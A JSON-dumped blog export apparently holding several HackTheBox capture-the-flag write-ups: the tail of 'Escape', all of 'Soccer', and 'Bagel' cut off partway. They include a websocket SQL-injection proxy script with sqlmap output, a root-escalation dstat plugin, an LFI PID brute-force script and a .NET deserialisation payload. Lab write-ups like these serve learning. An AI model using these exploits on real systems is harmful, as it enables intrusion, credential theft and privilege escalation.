DT3Npvytc3DQVTo2AffGBbZNQ39RMJGI/Mf07BeY4T3lfFvg1UkTJJHFAc8awSVWZY4XUYwx8RFScH4i/4RaWQ8jnWqXAfX+pWZueuqqrDPIXm0xs+/MTsEXtBuBWQ6c7KRPXZkiN4Y3VTS7pFJlMwkdgVjhRDKyPvMBJelWNzRVJW1ucvdzbYcCqer9khwqpXJ7EryNOYDgAObbFXvjVC1pZBjiyysSPOzDPSQwKO7b6diVpOqXrcjck0L4NDCvVsBibURet08zleTaOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEKhz7B6Xa7NjzFWiCqHeycihDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyMzA0MzAwMjQyMjdaphEYDzIwMjMwNDMwMTI0MjI3WqcRGA8yMDIzMDUwNzAyNDIyN1qoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg== [+] Ticket successfully imported! ServiceName : krbtgt/sequel.htb ServiceRealm : SEQUEL.HTB UserName : administrator UserRealm : SEQUEL.HTB StartTime : 4/29/2023 7:42:27 PM EndTime : 4/30/2023 5:42:27 AM RenewTill : 5/6/2023 7:42:27 PM Flags : name_canonicalize, pre_authent, initial, renewable KeyType : rc4_hmac Base64(key) : qHPsHpdrs2PMVaIKod7JyA== ASREP (key) : C02394705382548D60B69D45405F2638 [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : A52F78E4C751E5F5E17E1E9F3E58F4EE Now, we got the NTLM hash, we can again use evil-winrm and get the root flag:\nReferences: #https://0xdf.gitlab.io/2019/02/16/htb-giddy.html#get-net-ntlm\nhttps://0xdf.gitlab.io/2022/01/29/htb-anubis.html\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin\nCertificate Based Persistence \u0026gt; BorderGate\n","date":"19 June 2023","permalink":"/posts/escape-htb/","section":"Posts","summary":"This machine was medium level windows which involves SQL Server interaction, then using Responder to capture the hash of the sqlsvc user and then enumerating files on the system, from there obtaining password for another user and in the end taking advantage of a vulnerable ADCS Template to gain Administrator access.","title":"HackTheBox - Escape"},{"content":"","date":null,"permalink":"/tags/smb-windows-mssql-server-hashcat-evil-winrm-responder.py/","section":"Tags","summary":"","title":"Smb, Windows, Mssql-Server, Hashcat, Evil-Winrm, Responder.py"},{"content":"","date":null,"permalink":"/tags/dstat-sqlmap-upstream_proxy-websocket/","section":"Tags","summary":"","title":"Dstat, Sqlmap, Upstream_proxy, Websocket"},{"content":"Writeup for HackTheBox\u0026rsquo;s Soccer.\nStarting off with the nmap scan:\n# Nmap 7.92 scan initiated Tue Apr 18 16:38:39 2023 as: nmap -sV -sC -A -Pn -p 22,80 -o nmap_ports -vv -Pn 10.10.11.194 Nmap scan report for 10.10.11.194 (10.10.11.194) Host is up, received user-set (0.085s latency). Scanned at 2023-04-18 16:38:40 UTC for 9s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0= | 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk= | 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/ 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Apr 18 16:38:49 2023 -- 1 IP address (1 host up) scanned in 9.96 seconds We have port 80 and 22 open, nmap identified that the HTTP port is redirecting to the soccer.htb , performing a directory busting on it revealed an endpoint /tiny\n❯ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\\ \u0026gt; =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/04/18 16:41:03 Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u0026gt; http://soccer.htb/tiny/] It is a H3K File Manager, checking for any exploit for it revealed that we have PHP File Upload RCE:\nhttps://github.com/febinrev/tinyfilemanager-2.4.3-exploit\nExploitation requires an authenticated user, default credentials worked for the application:\nadmin:admin@123 Once uploaded, we can go the uploads folder and then upload a web shell and execute commands from there:\nNext, we can get a reverse shell from the web shell:\nThe user did not have any privilege to read flags or anything, performing extensive enumeration did not reveal any credentials that could be used, checking for the running services, we had port 3000 and 9091, checking /etc/hosts , we can see that it has soc-player.soccer.htb vhost and checking the nginx configuration, it is the application running on port 3000.\nNext up, adding the soc-player.soccer.htb to the hosts file and then registering for the new user on the website, we can see that it has ticket checking functionality, the request is made over websocket and it has following data\n{\u0026#34;id\u0026#34;: \u0026#34;45352\u0026#34;} Most probable attack in this case could be the SQL injection, but we cannot check it directly from burp. To tackle this, we can set up an upstream proxy and then use it for sending the payload to the websockert, following blog have a snippet which can be modified to be used:\nhttps://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\nModified script which will be hosting apython server at 8081 acting as an upstream proxy:\nfrom http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \u0026#34;ws://soc-player.soccer.htb:9091\u0026#34; def send_ws(payload): ws = create_connection(ws_server) # If the server returns a response on connect, use below line\t#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here # For our case, format the payload in JSON message = unquote(payload).replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;) # replacing \u0026#34; with \u0026#39; to avoid breaking JSON structure data = \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;%s\u0026#34;}\u0026#39; % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return \u0026#39;\u0026#39; def middleware_server(host_port,content_type=\u0026#34;text/plain\u0026#34;): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -\u0026gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split(\u0026#39;=\u0026#39;,1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = \u0026#39;No parameters specified!\u0026#39; self.send_header(\u0026#34;Content-type\u0026#34;, content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\u0026#34;[+] Starting MiddleWare Server\u0026#34;) print(\u0026#34;[+] Send payloads in http://localhost:8081/?id=*\u0026#34;) try: middleware_server((\u0026#39;0.0.0.0\u0026#39;,8081)) except KeyboardInterrupt: pass Using sqlmap we can identify that there is a TIME based SQL Injection:\nWe can dump the database using sqlmap :\n❯ sqlmap -u \u0026#34;http://localhost:8081/?id=1\u0026#34; -p \u0026#34;id\u0026#34; ___ __H__ ___ ___[(]_____ ___ ___ {1.6.5#stable} |_ -| . [(] | .\u0026#39;| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:32:55 /2023-04-18/ [17:32:55] [INFO] testing connection to the target URL [17:32:55] [WARNING] turning off pre-connect mechanism because of incompatible server (\u0026#39;SimpleHTTP/0.6 Python/3.9.10\u0026#39;) [17:32:55] [INFO] testing if the target URL content is stable [17:32:56] [INFO] target URL content is stable [17:32:56] [WARNING] heuristic (basic) test shows that GET parameter \u0026#39;id\u0026#39; might not be injectable [17:32:56] [INFO] testing for SQL injection on GET parameter \u0026#39;id\u0026#39; [17:32:56] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [17:32:58] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [17:32:59] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\u0026#39; [17:33:00] [INFO] testing \u0026#39;PostgreSQL AND error-based - WHERE or HAVING clause\u0026#39; [17:33:02] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)\u0026#39; [17:33:04] [INFO] testing \u0026#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)\u0026#39; [17:33:05] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [17:33:06] [INFO] testing \u0026#39;PostgreSQL \u0026gt; 8.1 stacked queries (comment)\u0026#39; [17:33:06] [WARNING] time-based comparison requires larger statistical model, please wait. (done) [17:33:08] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase stacked queries (comment)\u0026#39; [17:33:09] [INFO] testing \u0026#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)\u0026#39; [17:33:10] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [17:33:22] [INFO] GET parameter \u0026#39;id\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable it looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] Y [17:33:29] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [17:33:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [17:33:37] [INFO] target URL appears to be UNION injectable with 3 columns [17:37:06] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. \u0026#39;--dbms=mysql\u0026#39;) [17:37:06] [INFO] checking if the injection point on GET parameter \u0026#39;id\u0026#39; is a false positive sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests: --- Parameter: id (GET) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1 AND (SELECT 6120 FROM (SELECT(SLEEP(5)))ECkW) --- [17:37:47] [INFO] the back-end DBMS is MySQL [17:37:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions back-end DBMS: MySQL \u0026gt;= 5.0.12 [17:37:48] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/localhost\u0026#39; [17:37:48] [WARNING] your sqlmap version is outdated [..snip..] [17:38:02] [INFO] testing MySQL do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y [17:38:26] [INFO] confirming MySQL [17:38:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions [17:38:36] [INFO] adjusting time delay to 1 second due to good response times [17:38:36] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026gt;= 8.0.0 [17:38:36] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [17:38:36] [INFO] fetching current database [17:38:36] [INFO] retrieved: soccer_db [17:39:30] [INFO] fetching tables for database: \u0026#39;soccer_db\u0026#39; [17:39:30] [INFO] fetching number of tables for database \u0026#39;soccer_db\u0026#39; [17:39:30] [INFO] retrieved: 1 [17:39:33] [INFO] retrieved: accounts [17:40:18] [INFO] fetching columns for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:40:18] [INFO] retrieved: 4 [17:40:22] [INFO] retrieved: email [17:40:48] [INFO] retrieved: id [17:41:01] [INFO] retrieved: password [17:41:48] [INFO] retrieved: username [17:42:31] [INFO] fetching entries for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:42:31] [INFO] fetching number of entries for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:42:31] [INFO] retrieved: 1 [17:42:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done) [..snip..] [17:43:22] [INFO] testing MySQL [17:43:22] [INFO] confirming MySQL [17:43:22] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026gt;= 8.0.0 [17:43:22] [INFO] fetching columns for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:43:22] [INFO] resumed: 4 [17:43:22] [INFO] resumed: email [17:43:22] [INFO] resumed: id [17:43:22] [INFO] resumed: password [17:43:22] [INFO] resumed: username [17:43:22] [INFO] fetching entries for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:43:22] [INFO] fetching number of entries for table \u0026#39;accounts\u0026#39; in database \u0026#39;soccer_db\u0026#39; [17:43:22] [INFO] resumed: 1 [17:43:22] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done) do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y [17:44:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions [17:44:22] [INFO] adjusting time delay to 1 second due to good response times player@player.htb [17:45:59] [INFO] retrieved: 1324 [17:46:22] [INFO] retrieved: PlayerOftheMatch [17:48:04] [ERROR] invalid character detected. retrying.. [17:48:04] [WARNING] increasing time delay to 2 seconds 2022 Database: soccer_db Table: accounts [1 entry] +------+-------------------+----------------------+----------+ | id | email | password | username | +------+-------------------+----------------------+----------+ | 1324 | player@player.htb | PlayerOftheMatch2022 | player | +------+-------------------+----------------------+----------+ player:PlayerOftheMatch2022 We got a user’s password i.e. player , next up we can directly SSH into the machine as the player user, checking for any SUID binaries, we can see that doas can be ran as SUID, checking the doas.conf file to see how it is configured:\nplayer@soccer:~$ cat /usr/local/etc/doas.conf permit nopass player as root cmd /usr/bin/dstat We can see that dstat can be ran as root using doas , to exploit this we can add a dstat plugin with specified format of any existing plugin, following blog shows how to perform the steps clearly:\n💡 In this particular case, you need to specify a class `dstat_plugin` class in the plugin script i.e. the malicious python script, in order to make it work and comply with the `dstat` https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/\nJust adding a os.system function call which will execute the payload, making the /usr/bin/bash as a SUID binary:\nplayer@soccer:/usr/local/share/dstat$ cat \u0026gt; dstat_xploit.py class dstat_plugin(dstat): \u0026#34;\u0026#34;\u0026#34; Example \u0026#34;Hello world!\u0026#34; output plugin for aspiring Dstat developers. \u0026#34;\u0026#34;\u0026#34; def __init__(self): self.name = \u0026#39;plugin title\u0026#39; self.nick = (\u0026#39;counter\u0026#39;,) self.vars = (\u0026#39;text\u0026#39;,) self.type = \u0026#39;s\u0026#39; self.width = 12 self.scale = 0 def extract(self): import os os.system(\u0026#34;chmod +s /usr/bin/bash\u0026#34;) self.val[\u0026#39;text\u0026#39;] = \u0026#39;Hello world!\u0026#39; ^C player@soccer:/usr/local/share/dstat$ dstat -l ---load-avg--- 1m 5m 15m 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0^C player@soccer:/usr/local/share/dstat$ dstat --list internal: aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones /usr/share/dstat: battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib, innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb, mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load, snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg, top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil /usr/local/share/dstat: xploit player@soccer:/usr/local/share/ds Once executed, we can see that /usr/bin/bash has now became an SUID, we can spawn the bash in a privileged mode with -p and continue as root user in the machine:\nGet the flag:\nplayer@soccer:/usr/local/share/dstat$ ls -la /usr/bin/bash -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /usr/bin/bash player@soccer:/usr/local/share/dstat$ /usr/bin/bash -p bash-5.0# whoami root bash-5.0# id uid=1001(player) gid=1001(player) euid=0(root) egid=0(root) groups=0(root),1001(player) bash-5.0# cd /root bash-5.0# ls app root.txt run.sql\tsnap bash-5.0# cat root.txt 78e0183f20973bb59927b351bc26c4b1 ","date":"10 June 2023","permalink":"/posts/soccer-htb/","section":"Posts","summary":"Writeup for HackTheBox\u0026rsquo;s Soccer.\nStarting off with the nmap scan:\n# Nmap 7.92 scan initiated Tue Apr 18 16:38:39 2023 as: nmap -sV -sC -A -Pn -p 22,80 -o nmap_ports -vv -Pn 10.","title":"HackTheBox - Soccer"},{"content":"","date":null,"permalink":"/tags/deserialisation/","section":"Tags","summary":"","title":"Deserialisation"},{"content":"","date":null,"permalink":"/tags/dll/","section":"Tags","summary":"","title":"DLL"},{"content":"","date":null,"permalink":"/tags/dotnet/","section":"Tags","summary":"","title":"Dotnet"},{"content":"WriteUp for HackTheBox Bagel machine.\nStarting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):\nChecking the HTTP port, we see it is more of a static site, one thing that caught my eye was the page parameter in the URI:\nCapturing the request and checking in the burp suite for LFI resulted in success and we could see the /etc/passwd file contents ini the response:\nChecking for the current process, we see that it is running from the developer user’s directory and it is probably a flask application:\nWe can retrieve the contents of the [app.py](http://app.py) :\nChecking the [app.py](http://app.py) code, we see that it has an endpoint orders which connects to the websocket running on the port 5000 and sends a JSON body as a part of the request, we also notice that there is a comment mentioning another file which is responsible for handling the websocket request and it is build with dotnet\nfrom flask import Flask, request, send_file, redirect, Response import os.path import websocket,json app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;page\u0026#39; in request.args: page = \u0026#39;static/\u0026#39;+request.args.get(\u0026#39;page\u0026#39;) if os.path.isfile(page): resp=send_file(page) resp.direct_passthrough = False if os.path.getsize(page) == 0: resp.headers[\u0026#34;Content-Length\u0026#34;]=str(len(resp.get_data())) return resp else: return \u0026#34;File not found\u0026#34; else: return redirect(\u0026#39;http://localhost:8000/?page=index.html\u0026#39;, code=302) @app.route(\u0026#39;/orders\u0026#39;) def order(): # don\u0026#39;t forget to run the order app first with \u0026#34;dotnet \u0026lt;path to .dll\u0026gt;\u0026#34; command. Use your ssh key to access the machine. try: ws = websocket.WebSocket() ws.connect(\u0026#34;ws://127.0.0.1:5000/\u0026#34;) # connect to order app order = {\u0026#34;ReadOrder\u0026#34;:\u0026#34;orders.txt\u0026#34;} data = str(json.dumps(order)) ws.send(data) result = ws.recv() return(json.loads(result)[\u0026#39;ReadOrder\u0026#39;]) except: return(\u0026#34;Unable to connect\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) curl -i -s -k -X $\u0026#39;GET\u0026#39; \\ -H $\u0026#39;Host: bagel.htb:8000\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; \\ $\u0026#39;http://bagel.htb:8000/?page=../../../../.Dockerfile\u0026#39; Since there is no filename or path which was disclosed, given the LFI the best bet we have on this is to run a PID bruteforce with a script and get the cmdline information, following script does the work:\n#!/bin/bash for i in {0..999}; do pid=$i url=\u0026#34;http://bagel.htb:8000/?page=../../../../../proc/$pid/cmdline\u0026#34; curl -s \u0026#34;$url\u0026#34; | tee -a log.txt echo \u0026#34;\u0026#34; done Running the script I see that there is a bagel.dll running with dotnet , since we have the absolute path of the file, we can download it via the LFI\n❯ wget http://bagel.htb:8000/\\?page\\=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll --2023-04-19 18:11:06-- http://bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll Resolving bagel.htb (bagel.htb)... 10.10.11.201 Connecting to bagel.htb (bagel.htb)|10.10.11.201|:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 10752 (10K) [application/octet-stream] Saving to: ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’ index.html?page=..%2F..%2F..% 100%[================================================\u0026gt;] 10.50K --.-KB/s in 0s 2023-04-19 18:11:06 (48.7 MB/s) - ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’ saved [10752/10752] ❯ mv index.html\\?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll bagle.dll Now, it is time to analyze the DLL file using dnSpy\nAnalysing the bagel.dll #Checking the bagel.dll , it wasn’t big file so had limited number of classes and methods, one of the class was named as DB, it contained the SQL credentials for the dev user\nusing System; using Microsoft.Data.SqlClient; namespace bagel_server { // Token: 0x0200000A RID: 10 public class DB { // Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718 [Obsolete(\u0026#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.\u0026#34;)] public void DB_connection() { string text = \u0026#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K\u0026#34;; SqlConnection sqlConnection = new SqlConnection(text); } } } Since we already identified that there was a user named as developer , we might be able to SSH to the machine but it wasn’t working as the SSH server does not seem to accept the password from the remote user:\n❯ ssh developer@bagel.htb developer@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). During the process dumping, I identified that gssproxy is running as well, a little bit insight into the GSSAPI:\nGssapi-keyex: This authentication method uses the Generic Security Services Application Program Interface (GSSAPI) to authenticate the client. It negotiates a secure key exchange protocol to create a shared secret between the client and server. Gssapi-with-mic: This authentication method uses GSSAPI to authenticate the client, but it also includes a message integrity check (MIC) to ensure the authenticity of the message. 💡 GSSAPI is a generic security API used to authenticate client/server applications. GSSProxy is a service that allows users to obtain GSSAPI credentials on behalf of a service without having direct access to the user\u0026rsquo;s keytab.\nThe GSSProxy service is commonly used in environments where centralized authentication and authorization mechanisms are required, such as in large-scale enterprise networks. By acting as a proxy between a client application and the Kerberos authentication system, GSSProxy provides a secure and efficient way to obtain Kerberos credentials for a particular service.\nGSSProxy is implemented as a daemon process that runs on the client machine and communicates with the Kerberos authentication system. When a client application needs to authenticate with a service, it sends a request to GSSProxy, which then acquires the necessary credentials on behalf of the client and returns them to the application.\nIn summary, GSSProxy is a service that provides a secure and efficient way to obtain GSSAPI credentials for a particular service, without requiring direct access to the user\u0026rsquo;s keytab.\nIt seems that we won’t be able to authenticate to the SSH without any key or any GSSAPI key, digging deeper into the DLL file, we see that it accepts the JSON data and pass it to handler.Deserialise method to parse the JSON data:\nChecking the handler class and the deserialise method is making use of the Newtonsoft.Json class, since there is no explicit TypeHandling was defined i.e. 4 is not a valid constant value for the TypeHandling , this is vulnerable to Deserialisation attack, check the Source Code Analysis note for better insight:\nAs we can interact with the websocket, what we can do is, due to insecure deserialisation, we can craft a payload for performing deserialisation attack. We can interact to the service using following script:\n#!/usr/bin/python3 import websocket import json def order(data): # don\u0026#39;t forget to run the order app first with \u0026#34;dotnet \u0026lt;path to .dll\u0026gt;\u0026#34; command. Use your ssh key to access the machine. try: ws = websocket.WebSocket() ws.connect(\u0026#34;ws://10.10.11.201:5000/\u0026#34;) # connect to order app order = {\u0026#34;ReadOrder\u0026#34;:data} data = str(json.dumps(order)) ws.send(data) result = ws.recv() return(json.loads(result)) except Exception as E: print(E) return(\u0026#34;Unable to connect\u0026#34;) print(order(\u0026#34;orders.txt\u0026#34;)) Running the script with different inputs for the data , it works quite well:\n❯ python3 interact_bagel.py {\u0026#39;UserId\u0026#39;: 0, \u0026#39;Session\u0026#39;: \u0026#39;Unauthorized\u0026#39;, \u0026#39;Time\u0026#39;: \u0026#39;8:20:01\u0026#39;, \u0026#39;RemoveOrder\u0026#39;: None, \u0026#39;WriteOrder\u0026#39;: None, \u0026#39;ReadOrder\u0026#39;: \u0026#39;Order not found!\u0026#39;} - ../../../../etc/passwd ❯ python3 interact_bagel.py {\u0026#39;UserId\u0026#39;: 0, \u0026#39;Session\u0026#39;: \u0026#39;Unauthorized\u0026#39;, \u0026#39;Time\u0026#39;: \u0026#39;8:20:17\u0026#39;, \u0026#39;RemoveOrder\u0026#39;: None, \u0026#39;WriteOrder\u0026#39;: None, \u0026#39;ReadOrder\u0026#39;: \u0026#39;Order not found!\u0026#39;} - ../../../.././etc/hosts ❯ python3 interact_bagel.py {\u0026#39;UserId\u0026#39;: 0, \u0026#39;Session\u0026#39;: \u0026#39;Unauthorized\u0026#39;, \u0026#39;Time\u0026#39;: \u0026#39;8:20:24\u0026#39;, \u0026#39;RemoveOrder\u0026#39;: None, \u0026#39;WriteOrder\u0026#39;: None, \u0026#39;ReadOrder\u0026#39;: \u0026#39;abc\u0026#39;} - ../../../../../../orders.txt There is a method called RemoveOrder which does not have any objects defined in it like other methods\nThere was another class named as File containing a method called ReadFile which could be the perfect target for the attack as we can retrieve any arbitrary file:\nNow, we can craft the payload as follows:\n{\u0026#34;RemoveOrder\u0026#34;: {\u0026#34;$type\u0026#34;: \u0026#34;bagel_server.File, bagel\u0026#34;, \u0026#34;ReadFile\u0026#34;: data}} RemoveOrder is one of the methods we can call, using the $type , we can specify bagel_server.File, bagel such as we will be calling a method from that specific location i.e. ReadFile , lastly the data is the argument for the ReadFile\n#!/usr/bin/python3 import websocket import json def order(data): # don\u0026#39;t forget to run the order app first with \u0026#34;dotnet \u0026lt;path to .dll\u0026gt;\u0026#34; command. Use your ssh key to access the machine. try: ws = websocket.WebSocket() ws.connect(\u0026#34;ws://10.10.11.201:5000/\u0026#34;) # connect to order app order = {\u0026#34;RemoveOrder\u0026#34;: {\u0026#34;$type\u0026#34;: \u0026#34;bagel_server.File, bagel\u0026#34;, \u0026#34;ReadFile\u0026#34;: data}} data = str(json.dumps(order)) ws.send(data) result = ws.recv() return(json.loads(result)) except Exception as E: print(E) return(\u0026#34;Unable to connect\u0026#34;) print(order(\u0026#34;../../../../../../../etc/passwd\u0026#34;)) Checking it with the /etc/passwd , it worked like a charm\n❯ python3 interact_bagel.py 